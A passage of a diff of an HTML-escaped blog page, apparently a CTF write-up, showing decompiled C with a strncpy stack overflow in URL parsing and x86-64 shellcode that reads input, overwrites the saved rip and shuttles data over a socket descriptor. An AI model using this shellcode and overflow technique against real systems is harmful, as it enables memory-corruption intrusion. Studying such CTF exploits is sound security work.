-&lt;/span&gt;&lt;span class='line'&gt;      ++nptr;
-&lt;/span&gt;&lt;span class='line'&gt;    }
-&lt;/span&gt;&lt;span class='line'&gt;    nptr = (char *)(a1 + 7);
-&lt;/span&gt;&lt;span class='line'&gt;    v4 = strlen((const char *)(a1 + 7));
-&lt;/span&gt;&lt;span class='line'&gt;    strncpy(&amp;dest, (const char *)(a1 + 7), v4);
-&lt;/span&gt;&lt;span class='line'&gt;    result = sub_400B97((__int64)&amp;dest, v9);
-&lt;/span&gt;&lt;span class='line'&gt;  }
-&lt;/span&gt;&lt;span class='line'&gt;  return result;
-&lt;/span&gt;&lt;span class='line'&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/notextile&gt;&lt;/div&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_400BAC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax@1&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax@4&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax@6&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax@9&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+10h] [bp-220h]@9&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+210h] [bp-20h]@2&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+218h] [bp-18h]@2&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+220h] [bp-10h]@1&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+22Eh] [bp-2h]@1&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unk_401194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;http://&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_400B97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;br&gt;
@@ -231,127 +139,66 @@ However, finding shellcode address is very hard. on this account, i faild to sol
 i saved stack. then stack overwrite rip :P.
 &lt;br&gt;&lt;/p&gt;
 
-&lt;div class='bogus-wrapper'&gt;&lt;notextile&gt;&lt;figure class='code'&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre class=&quot;line-numbers&quot;&gt;&lt;span class='line-number'&gt;1&lt;/span&gt;
-&lt;span class='line-number'&gt;2&lt;/span&gt;
-&lt;span class='line-number'&gt;3&lt;/span&gt;
-&lt;span class='line-number'&gt;4&lt;/span&gt;
-&lt;span class='line-number'&gt;5&lt;/span&gt;
-&lt;span class='line-number'&gt;6&lt;/span&gt;
-&lt;span class='line-number'&gt;7&lt;/span&gt;
-&lt;span class='line-number'&gt;8&lt;/span&gt;
-&lt;span class='line-number'&gt;9&lt;/span&gt;
-&lt;span class='line-number'&gt;10&lt;/span&gt;
-&lt;span class='line-number'&gt;11&lt;/span&gt;
-&lt;span class='line-number'&gt;12&lt;/span&gt;
-&lt;span class='line-number'&gt;13&lt;/span&gt;
-&lt;span class='line-number'&gt;14&lt;/span&gt;
-&lt;span class='line-number'&gt;15&lt;/span&gt;
-&lt;span class='line-number'&gt;16&lt;/span&gt;
-&lt;span class='line-number'&gt;17&lt;/span&gt;
-&lt;span class='line-number'&gt;18&lt;/span&gt;
-&lt;span class='line-number'&gt;19&lt;/span&gt;
-&lt;span class='line-number'&gt;20&lt;/span&gt;
-&lt;span class='line-number'&gt;21&lt;/span&gt;
-&lt;span class='line-number'&gt;22&lt;/span&gt;
-&lt;span class='line-number'&gt;23&lt;/span&gt;
-&lt;span class='line-number'&gt;24&lt;/span&gt;
-&lt;span class='line-number'&gt;25&lt;/span&gt;
-&lt;span class='line-number'&gt;26&lt;/span&gt;
-&lt;span class='line-number'&gt;27&lt;/span&gt;
-&lt;span class='line-number'&gt;28&lt;/span&gt;
-&lt;span class='line-number'&gt;29&lt;/span&gt;
-&lt;span class='line-number'&gt;30&lt;/span&gt;
-&lt;span class='line-number'&gt;31&lt;/span&gt;
-&lt;span class='line-number'&gt;32&lt;/span&gt;
-&lt;span class='line-number'&gt;33&lt;/span&gt;
-&lt;span class='line-number'&gt;34&lt;/span&gt;
-&lt;span class='line-number'&gt;35&lt;/span&gt;
-&lt;span class='line-number'&gt;36&lt;/span&gt;
-&lt;span class='line-number'&gt;37&lt;/span&gt;
-&lt;span class='line-number'&gt;38&lt;/span&gt;
-&lt;span class='line-number'&gt;39&lt;/span&gt;
-&lt;span class='line-number'&gt;40&lt;/span&gt;
-&lt;span class='line-number'&gt;41&lt;/span&gt;
-&lt;span class='line-number'&gt;42&lt;/span&gt;
-&lt;span class='line-number'&gt;43&lt;/span&gt;
-&lt;span class='line-number'&gt;44&lt;/span&gt;
-&lt;span class='line-number'&gt;45&lt;/span&gt;
-&lt;span class='line-number'&gt;46&lt;/span&gt;
-&lt;span class='line-number'&gt;47&lt;/span&gt;
-&lt;span class='line-number'&gt;48&lt;/span&gt;
-&lt;span class='line-number'&gt;49&lt;/span&gt;
-&lt;span class='line-number'&gt;50&lt;/span&gt;
-&lt;span class='line-number'&gt;51&lt;/span&gt;
-&lt;span class='line-number'&gt;52&lt;/span&gt;
-&lt;span class='line-number'&gt;53&lt;/span&gt;
-&lt;span class='line-number'&gt;54&lt;/span&gt;
-&lt;span class='line-number'&gt;55&lt;/span&gt;
-&lt;span class='line-number'&gt;56&lt;/span&gt;
-&lt;span class='line-number'&gt;57&lt;/span&gt;
-&lt;span class='line-number'&gt;58&lt;/span&gt;
-&lt;span class='line-number'&gt;59&lt;/span&gt;
-&lt;span class='line-number'&gt;60&lt;/span&gt;
-&lt;/pre&gt;&lt;/td&gt;&lt;td class='code'&gt;&lt;pre&gt;&lt;code class=''&gt;&lt;span class='line'&gt;%define FD 4
-&lt;/span&gt;&lt;span class='line'&gt;section .text
-&lt;/span&gt;&lt;span class='line'&gt;global _start
-&lt;/span&gt;&lt;span class='line'&gt;_start:
-&lt;/span&gt;&lt;span class='line'&gt;  lea r9, [rsp-0x100] &amp;lt;------ save stack
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rsi,0x602070 
-&lt;/span&gt;&lt;span class='line'&gt;        mov edi, 1
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rax, 1
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rdx, 8
-&lt;/span&gt;&lt;span class='line'&gt;        syscall
-&lt;/span&gt;&lt;span class='line'&gt;  
-&lt;/span&gt;&lt;span class='line'&gt;  mov qword rsi, 0x602068
-&lt;/span&gt;&lt;span class='line'&gt;  mov edi, 1
-&lt;/span&gt;&lt;span class='line'&gt;  mov qword rax, 1
-&lt;/span&gt;&lt;span class='line'&gt;  mov qword rdx, 8
-&lt;/span&gt;&lt;span class='line'&gt;  syscall
-&lt;/span&gt;&lt;span class='line'&gt;
-&lt;/span&gt;&lt;span class='line'&gt;        mov rax, 1                                                                                                    
-&lt;/span&gt;&lt;span class='line'&gt;        mov edi, 1                                                                                                    
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rsi,0x4011f4                                                                                        
-&lt;/span&gt;&lt;span class='line'&gt;        mov rdx, 4                                                                                                    
-&lt;/span&gt;&lt;span class='line'&gt;        syscall                                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;                                                                                                                      
-&lt;/span&gt;&lt;span class='line'&gt;        xor rax, rax                                                                                                  
-&lt;/span&gt;&lt;span class='line'&gt;        xor edi, edi                                                                                                  
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rdx, 4                                                                                              
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rsi, 0x602008                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;        syscall                                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;                                                                                                                      
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rax, 1                                                                                              
-&lt;/span&gt;&lt;span class='line'&gt;        mov edi, FD                                                                                                   
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rsi, 0x602008                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rdx, 4                                                                                              
-&lt;/span&gt;&lt;span class='line'&gt;        syscall
-&lt;/span&gt;&lt;span class='line'&gt;  
-&lt;/span&gt;&lt;span class='line'&gt;  sub rsp, 0x600
-&lt;/span&gt;&lt;span class='line'&gt;  mov rax, 0
-&lt;/span&gt;&lt;span class='line'&gt;  mov edi, 0
-&lt;/span&gt;&lt;span class='line'&gt;  mov rsi, rsp
-&lt;/span&gt;&lt;span class='line'&gt;  mov rdx, 0x500
-&lt;/span&gt;&lt;span class='line'&gt;  syscall
-&lt;/span&gt;&lt;span class='line'&gt;  mov qword [rsp+0x234], r9 &amp;lt;-------- overwrite rip
-&lt;/span&gt;&lt;span class='line'&gt;  mov qword rax, 1                                                                                              
-&lt;/span&gt;&lt;span class='line'&gt;        mov edi, FD                                                                                                   
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rsi, rsp                                                                                            
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rdx, 0x500                                                                                          
-&lt;/span&gt;&lt;span class='line'&gt;        syscall                                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;        add rsp, 0x600                                                                                                
-&lt;/span&gt;&lt;span class='line'&gt;                                                                                                                      
-&lt;/span&gt;&lt;span class='line'&gt;        xor rax, rax                                                                                                  
-&lt;/span&gt;&lt;span class='line'&gt;        xor edi, edi                                                                                                  
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rsi, 0x6020b8                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;        mov rdx, 119                                                                                                  
-&lt;/span&gt;&lt;span class='line'&gt;        syscall                                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;                                                                                                                      
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rax, 1                                                                                              
-&lt;/span&gt;&lt;span class='line'&gt;        mov edi, 1                                                                                                    
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rsi, 0x6020B8                                                                                       
-&lt;/span&gt;&lt;span class='line'&gt;        mov qword rdx, 119                                                                                            
-&lt;/span&gt;&lt;span class='line'&gt;        syscall
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/notextile&gt;&lt;/div&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-asm&quot; data-lang=&quot;asm&quot;&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;FD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;.text&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;_start&lt;/span&gt;
+&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;r9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;rsp-0x100&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;save&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;stack&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0x602070&lt;/span&gt; 
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;syscall&lt;/span&gt;
+    
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x602068&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;syscall&lt;/span&gt;
+
+        &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                                                                                                    
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                                                                                                    
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0x4011f4&lt;/span&gt;                                                                                        
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;                                                                                                    
+        &lt;span class=&quot;no&quot;&gt;syscall&lt;/span&gt;                                                                                                       
+                                                                                                                      
